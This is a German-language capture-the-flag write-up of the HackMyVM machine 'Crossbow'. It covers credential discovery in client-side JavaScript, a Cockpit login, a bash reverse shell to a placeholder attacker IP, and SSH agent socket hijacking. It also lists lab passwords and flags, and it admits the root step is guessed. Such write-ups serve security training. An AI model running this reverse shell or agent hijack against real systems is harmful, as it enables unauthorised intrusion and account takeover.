# Crossbow - HackMyVM (Medium)

![Crossbow Icon](Crossbow.png)

## Übersicht

*   **VM:** Crossbow
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Crossbow)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 8. Dezember 2023
*   **Original-Writeup:** https://alientec1908.github.io/Crossbow_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Die virtuelle Maschine "Crossbow" von HackMyVM (Schwierigkeitsgrad: Medium) wurde durch eine Kette von Schwachstellen kompromittiert. Die initiale Informationsbeschaffung führte zur Entdeckung eines API-Keys (als Snefru-Hash) im JavaScript-Code einer Webseite. Nach Entschlüsselung dieses Hashes konnte damit auf eine Cockpit-Instanz auf Port 9090 als Benutzer `polo` zugegriffen werden. Über das integrierte Terminal von Cockpit wurde eine Reverse Shell erlangt. Die Privilegienerweiterung zum Benutzer `lea` erfolgte durch SSH Agent Hijacking, indem auf einen SSH-Agent-Socket des Benutzers `lea` im `/tmp`-Verzeichnis zugegriffen wurde. Der finale Schritt zur Root-Eskalation wurde im Original-Writeup nicht detailliert, aber die Flags wurden präsentiert.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi`
*   `wfuzz` (für vHost Fuzzing)
*   `nmap`
*   `nikto`
*   `gobuster`
*   `curl`
*   Web Browser
*   md5hashing.net (oder ähnliches Online-Tool für Snefru-Hash-Decryption)
*   `nc` (netcat)
*   Standard Linux-Befehle (`find`, `ss`, `ps`, `grep`, `awk`, `ls`, `cat`, `cd`)
*   `ssh-agent`, `ssh`
*   `whatweb` (im Tool-Verzeichnis gelistet, aber nicht explizit im Ablauf verwendet)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Crossbow" erfolgte in diesen Schritten:

1.  **Reconnaissance & Web Enumeration:**
    *   Ziel-IP (`192.168.2.122`, Hostname `crossbow.hmv`) via `arp-scan` und `/etc/hosts` identifiziert.
    *   vHost-Fuzzing mit `wfuzz` fand keine weiteren Subdomains für `crossbow.hmv`.
    *   `nmap` zeigte offene Ports: 22 (SSH 9.2p1), 80 (Apache 2.4.57 - Titel "Polo's Adventures") und 9090 (unbekannter Dienst, vermutlich Cockpit).
    *   `nikto` auf Port 80 ergab nur geringfügige Funde.
    *   `gobuster` auf Port 80 fand `app.js` und `config.js`.

2.  **Credential Discovery & Cockpit Access:**
    *   Analyse von `config.js` offenbarte einen API-Endpunkt (`https://phishing.crossbow.hmv/data`) und einen `HASH_API_KEY`: `49ef6b765d39f06ad6a20bc951308393`. Metadaten verwiesen auf "SnefruTools V1".
    *   Der Hash wurde als Snefru-Hash identifiziert und online zu `ELzkRudzaNXRyNuN6` entschlüsselt.
    *   Der Hostname `phishing.crossbow.hmv` wurde zur `/etc/hosts`-Datei hinzugefügt.
    *   Mit dem Benutzernamen `polo` (aus dem Seitentitel "Polo's Adventures") und dem entschlüsselten Passwort `ELzkRudzaNXRyNuN6` gelang der Login in die Cockpit-Weboberfläche auf `http://crossbow.hmv:9090/`.

3.  **Initial Access (polo via Cockpit Terminal):**
    *   Über das integrierte Terminal der Cockpit-Weboberfläche wurde ein Bash-Reverse-Shell-Befehl ausgeführt: `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'`.
    *   Eine Reverse Shell als Benutzer `polo` wurde erfolgreich etabliert.

4.  **Privilege Escalation (polo zu lea via SSH Agent Hijacking):**
    *   Enumeration als `polo` zeigte im `/tmp`-Verzeichnis einen SSH-Agent-Socket, der dem Benutzer `lea` gehörte (z.B. `/tmp/ssh-XXXXXX0hTUR2/agent.[PID]`).
    *   Der `ssh-agent`-Prozess für `lea` wurde ebenfalls mit `ps` identifiziert.
    *   Durch Setzen der Umgebungsvariable `SSH_AUTH_SOCK` auf den Pfad zum Socket von `lea` und Ausführen von `ssh lea@crossbow.hmv` (oder `ssh lea@localhost`) konnte die Authentifizierung über den gekaperten Agenten erfolgen.
    *   Eine Shell als Benutzer `lea` wurde erlangt.
    *   Die User-Flag wurde (vermutlich) aus `/home/lea/user.txt` gelesen.

5.  **Privilege Escalation (lea zu root):**
    *   *Dieser Schritt wurde im ursprünglichen Writeup-Log nicht detailliert. Es wird angenommen, dass weitere Enumeration als `lea` (z.B. `sudo -l`, SUID-Binaries, Kernel-Exploits) zu Root-Rechten führte.*

## Wichtige Schwachstellen und Konzepte

*   **Client-Side Credential Leakage:** API-Key (als unsicherer Snefru-Hash) im JavaScript-Code.
*   **Verwendung unsicherer Hash-Algorithmen:** Snefru ist für die Passwortspeicherung ungeeignet.
*   **Schwache Passwörter / Passwort-Wiederverwendung:** Das entschlüsselte API-Passwort war auch das Cockpit-Passwort für `polo`.
*   **Command Execution via Admin Panel:** Ausführung einer Reverse Shell über das Cockpit-Terminal.
*   **SSH Agent Hijacking:** Ausnutzung eines zugänglichen SSH-Agent-Sockets eines anderen Benutzers zur Identitätsübernahme.
*   **Unsichere Berechtigungen im `/tmp`-Verzeichnis:** Erleichterten das SSH Agent Hijacking.

## Flags

*   **User Flag (`/home/lea/user.txt` - vermutet):** `58cb1e1bdb3a348ddda53f22ee7c1613`
*   **Root Flag (`/root/root.txt` - vermutet):** `7a299c41b1daac46d5ab98745b212e09`

## Tags

`HackMyVM`, `Crossbow`, `Medium`, `Web`, `JavaScript`, `Snefru Hash`, `Cockpit`, `Reverse Shell`, `SSH Agent Hijacking`, `Privilege Escalation`, `Linux`
